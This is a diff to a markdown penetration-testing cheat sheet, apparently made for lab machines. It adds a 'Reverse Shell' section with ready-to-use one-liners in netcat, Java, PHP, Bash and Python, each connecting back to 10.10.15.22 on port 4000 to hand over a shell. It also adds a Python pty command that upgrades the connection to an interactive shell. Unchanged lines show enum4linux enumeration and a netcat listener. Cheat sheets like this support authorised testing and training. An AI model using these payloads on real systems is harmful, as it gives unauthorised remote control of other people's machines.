@@ -48,10 +48,35 @@ enum4linux -U -o 10.10.10.10
 nc -lnvp 4000
 ```
 
-### Set Reverse Shell on Target
+### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+#### netcat
 ```bash
 nc -e /bin/sh 10.10.15.22 4000
 ```
+#### Java
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.22/4000;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+#### PHP
+```php
+php -r '$sock=fsockopen("10.10.15.22",4000);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+#### Bash
+```bash
+bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
+```
+#### Python
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+### Interactive Shell
+#### Python 
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
 ## Usefuls Scripts
 ### HEX Converter
 ```bash
